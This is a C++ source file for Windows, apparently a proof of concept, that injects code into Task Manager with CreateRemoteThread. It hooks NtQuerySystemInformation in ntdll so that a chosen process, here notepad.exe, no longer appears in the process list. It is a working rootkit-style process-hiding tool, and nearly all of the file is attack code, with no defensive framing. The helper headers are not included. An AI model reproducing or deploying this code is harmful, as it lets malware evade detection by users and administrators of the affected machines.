/*************************************************************************************
Important project settings:

config: Release x64
Project\Settings\C/C++\Code Generation\Security Check\Disable Security Check (/GS-)
Project\Settings\C/C++\Optimization\Disabled (/Od)
Project\Settings\C/C++\Linker\Enable Incremental linking\No (/INCREMENTAL:NO)
**************************************************************************************/

#include "pch.h" 
#include <iostream>
#include "utils.h"
#include "injected.h"

const WCHAR *TARGET_PROCESS = L"Taskmgr.exe"; // L"procexp64.exe"
const WCHAR *HIDDEN_PROCESS = L"notepad.exe";


int main(int argc, char *argv[])
{
	HANDLE hProcess;
	SIZE_T size;  // Calculated function size (= AfterFunc() - Func())
	PVOID pHookRemote = NULL;
	PVOID pUnhookRemote = NULL;
	PVOID pHookedNtQueryRemote = NULL;
	PVOID pDataRemote = NULL;
	HANDLE hThread = NULL;
	INJDATA dataLocal;

	DWORD targetPID = pidof(TARGET_PROCESS);
	printf("targetPID: %d\n", targetPID);
	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPID);
	if (!hProcess)
	{
		printf("Could not get a handle to the process.");
		return EXIT_FAILURE;
	}

	__try
	{
		size = (PBYTE)AfterHook - (PBYTE)Hook;
		printf("Hook size: %llu\n", size);
		pHookRemote = injectCode(hProcess, &Hook, size);
		if (!pHookRemote)
			__leave;

		size = (PBYTE)AfterUnhook - (PBYTE)Unhook;
		pUnhookRemote = injectCode(hProcess, &Unhook, size);
		if (!pUnhookRemote)
			__leave;

		size = (PBYTE)AfterHookedNtQuerySystemInformation - (PBYTE)HookedNtQuerySystemInformation;
		printf("HookedNtQuerySystemInformation size: %llu\n", size);
		pHookedNtQueryRemote = injectCode(hProcess, &HookedNtQuerySystemInformation, size);
		if (!pHookedNtQueryRemote)
			__leave;

		strcpy_s(dataLocal.dllToHook, MAX_INJDATA_STR_LEN, "ntdll.dll");
		strcpy_s(dataLocal.funcToHook, MAX_INJDATA_STR_LEN, "NtQuerySystemInformation");
		dataLocal.fnHook = (_Hook)pHookRemote;
		dataLocal.fnHooked = (_NtQuerySystemInformation)pHookedNtQueryRemote;
		dataLocal.hiddenPID = pidof(HIDDEN_PROCESS);
		dataLocal.fnGetModuleHandle = &GetModuleHandle;
		dataLocal.fnStrcmp = &strcmp;
		dataLocal.fnVirtualProtect = &VirtualProtect;

		pDataRemote = injectCode(hProcess, &dataLocal, sizeof(dataLocal));
		if (!pDataRemote)
			__leave;

		size = (PBYTE)AfterHookedNtQuerySystemInformation - (PBYTE)HookedNtQuerySystemInformation;
		if (!patchDummyAddr(hProcess, &HookedNtQuerySystemInformation, pHookedNtQueryRemote, size, pDataRemote))
			__leave;


		hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pHookRemote, pDataRemote, 0, NULL);
		if (!hThread)
			__leave;
		WaitForSingleObject(hThread, INFINITE);
		CloseHandle(hThread);

		printf("Press ENTER key to unhook the function and exit.");
		getchar();
		
		hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pUnhookRemote, pDataRemote, 0, NULL);
		if (!hThread)
			__leave;
		WaitForSingleObject(hThread, INFINITE);
		CloseHandle(hThread);

	}
	__finally
	{
		if (pHookRemote)
			VirtualFreeEx(hProcess, pHookRemote, 0, MEM_RELEASE);
		if (pUnhookRemote)
			VirtualFreeEx(hProcess, pUnhookRemote, 0, MEM_RELEASE);
		if (pHookedNtQueryRemote)
			VirtualFreeEx(hProcess, pHookedNtQueryRemote, 0, MEM_RELEASE);
		if (pDataRemote)
			VirtualFreeEx(hProcess, pDataRemote, 0, MEM_RELEASE);
	}

	CloseHandle(hProcess);
	return 0;
}